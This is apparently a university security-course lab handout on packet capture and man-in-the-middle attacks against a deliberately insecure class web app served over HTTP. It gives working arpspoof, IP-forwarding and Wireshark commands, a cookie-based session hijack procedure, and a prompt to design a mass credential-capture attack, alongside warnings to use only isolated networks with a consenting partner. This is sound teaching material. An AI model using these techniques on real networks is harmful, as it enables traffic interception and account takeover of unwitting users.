# Week 2 Lab — Networking, Packet Capture, and Man-in-the-Middle

**Lecture:** Intro to Networking, OSI Model, and MITM Attacks

---

## Overview

HuskyHub transmits all data over plain HTTP. This week you will use Wireshark to capture your own login traffic and see your credentials in cleartext. You will then perform an ARP spoofing attack against a lab partner to intercept their session cookie and impersonate them without knowing their password.

No remediation this week. The goal is to viscerally understand why encryption in transit matters before you implement it in Week 3.

---

## ⚠️ Network and Acceptable Use Policy Warning

**Do NOT perform the ARP spoofing portion of this lab (Steps 6–11) on the UW campus network or any school-provided wifi.**

ARP spoofing poisons ARP caches across your entire network subnet — not just between you and your lab partner. On a shared school network this affects other users' traffic and constitutes unauthorized interference with a computer network, which violates the UW Acceptable Use Policy and may violate the Computer Fraud and Abuse Act (18 U.S.C. § 1030).

**Required setup for Steps 6–11:** Both you and your lab partner must be connected to an **isolated local network** — a personal mobile hotspot, a home router, or a dedicated lab switch. The key requirement is that no other people are on the same network segment during the exercise.

Steps 1–5 (Wireshark on your own localhost traffic) are safe to perform anywhere.

---

## Tools

| Tool | Purpose |
|------|---------|
| Wireshark | Packet capture and traffic analysis |
| arpspoof (dsniff package) | ARP spoofing to position yourself as a MITM |
| Terminal | Execute commands |
| ip / ifconfig / ipconfig | Identify network interfaces and IP addresses |
| Browser Developer Tools | Manually set cookies |

### Installing Tools by Platform

**macOS:**
```bash
brew install wireshark dsniff
```
> If `brew` is not installed, run the one-liner at [brew.sh](https://brew.sh) first.

**Linux (Debian/Ubuntu):**
```bash
sudo apt update && sudo apt install wireshark dsniff
```
> During Wireshark install, select **Yes** when asked whether non-root users may capture packets.

**Windows:**
- Download Wireshark from [wireshark.org/download](https://www.wireshark.org/download.html) and install normally.
- `arpspoof` (from the dsniff package) does not have an official Windows build. Windows users must use **WSL 2** (Windows Subsystem for Linux) to run arpspoof.

**Installing WSL 2 on Windows (required for arpspoof):**
```powershell
# Run in PowerShell as Administrator
wsl --install
# Restart your machine, then open the Ubuntu app that was installed
# Inside WSL:
sudo apt update && sudo apt install dsniff
```

> All `arpspoof` and `sysctl` commands in this lab must be run inside WSL on Windows. Wireshark itself runs natively in Windows.

---

## Steps

### 1. Identify Your Network Interface

**macOS / Linux:**
```bash
ifconfig        # macOS
ip addr         # Linux
```

**Windows (PowerShell):**
```powershell
ipconfig
```

**Windows (WSL):**
```bash
ip addr
```

Record your IP address and the name of the active interface (e.g., `eth0`, `en0`, `wlan0`, or `Wi-Fi`).

---

### 2. Start a Wireshark Capture

Open Wireshark. Select your active network interface. Start capturing (the blue shark fin button) **before** you log in.

> **macOS note:** If no interfaces appear, open System Preferences → Privacy & Security → and grant Wireshark permission to capture packets, then relaunch.

> **Windows note:** Select the interface named **Loopback: lo** or **Npcap Loopback Adapter** to capture localhost traffic.

---

### 3. Log In to HuskyHub

With the capture running, navigate to `http://localhost:80/login` and submit your credentials. Stop the capture as soon as you are redirected to the home page.

---

### 4. Find Your Credentials in the Capture

In the Wireshark filter bar, enter:
```
http.request.method == "POST"
```

Locate the login POST request. Click it and expand the **HTML Form URL Encoded** section in the packet detail pane. Record exactly what you see. Screenshot this.

---

### 5. Find Your Session Cookie

Change the Wireshark filter to:
```
http.cookie
```

Locate a request that contains your session cookie. Record the full cookie name and value. Note that this value alone is sufficient to impersonate your authenticated session.

---

### 6. Partner Setup (MITM Exercise)

> **Reminder:** Both machines must be on an isolated personal network — not school wifi. See the warning at the top of this lab.

Pair with a lab partner. Designate one person as the **victim** (logged into HuskyHub on their machine) and one as the **attacker**. Connect both machines to the same personal hotspot or home router.

Record the victim's IP address and the network gateway IP:

**macOS:**
```bash
netstat -rn | grep default
```

**Linux:**
```bash
ip route    # look for "default via <gateway>"
```

**Windows (PowerShell):**
```powershell
Get-NetRoute -DestinationPrefix "0.0.0.0/0"
```

**Windows (WSL):**
```bash
ip route
```

---

### 7. Enable IP Forwarding on the Attacker Machine

This ensures traffic continues to flow so the victim does not lose connectivity during the attack.

**macOS:**
```bash
sudo sysctl -w net.inet.ip.forwarding=1
```

**Linux:**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

**Windows (WSL):**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

---

### 8. Execute the ARP Spoofing Attack

Open two terminals (or two WSL windows on Windows) on the attacker machine and run both commands simultaneously:

```bash
# Terminal 1: Tell the victim that you are the gateway
sudo arpspoof -i <interface> -t <victim-ip> <gateway-ip>

# Terminal 2: Tell the gateway that you are the victim
sudo arpspoof -i <interface> -t <gateway-ip> <victim-ip>
```

> **macOS note:** The interface will typically be `en0` (Wi-Fi) or `en1`. Confirm with `ifconfig`.

> **Windows (WSL) note:** The interface inside WSL will typically be `eth0`. Confirm with `ip addr` inside WSL.

---

### 9. Capture the Victim's Session Cookie

While both arpspoof processes are running, start a Wireshark capture on the **attacker machine** (using the native Wireshark application on macOS or Windows) filtered to the victim's IP:
```
ip.addr == <victim-ip> && http.cookie
```

Ask your partner to navigate to any page in HuskyHub. Locate their session cookie in the capture. Record the full value.

---

### 10. Impersonate the Victim

In your browser, open Developer Tools → **Application → Cookies → localhost**.

Manually set the `authenticated` cookie to the value you captured. Set the `role` and `user_id` cookies to match what you observed.

Reload `http://localhost`. Document what you can now access.

---

### 11. Restore the Network

Stop both arpspoof processes (`Ctrl+C`). ARP caches will repair themselves within a minute. Confirm your partner's HuskyHub session is unaffected.

Disable IP forwarding:

**macOS:**
```bash
sudo sysctl -w net.inet.ip.forwarding=0
```

**Linux / WSL:**
```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

---

## Write-Up Questions

**Q1.** At what OSI layer does ARP spoofing operate? At what layer does the credential exposure occur? Explain how a Layer 2 attack enables a Layer 7 data breach.

**Q2.** Paste the relevant section of your Wireshark capture showing the POST request (redact the actual password value). Which filter did you use and what field in the packet contained the credentials?

**Q3.** You impersonated your lab partner using only their session cookie — no password required. What does this tell you about how HuskyHub authenticates users after login? What is the difference between authentication and session management, and which one failed here?

**Q4.** At which OSI layer would HTTPS protect against each of the two attacks performed today (credential capture and cookie theft)? Would HTTPS fully prevent both? Explain any remaining risk.

**Q5.** The ARP spoofing attack required you to be on the same local network as your target. What are realistic scenarios in which an attacker could be on the same network as a user of a public web application?

---

## Hacker Mindset Prompt

An attacker intercepting traffic at a coffee shop is combining a Layer 2 manipulation with passive observation. The attack is silent, requires no vulnerability in the target application, and is nearly undetectable by the victim.

Reflect on:

- **Contrarian:** This attack requires no login, no exploit, and no interaction with the application at all. What assumption about "security" does this challenge?
- **Committed:** A committed attacker who captures a valid session cookie does not stop at reading one page. Describe the next three steps they would take.
- **Creative:** How would you design a network attack that captures credentials from many users simultaneously rather than one targeted victim?
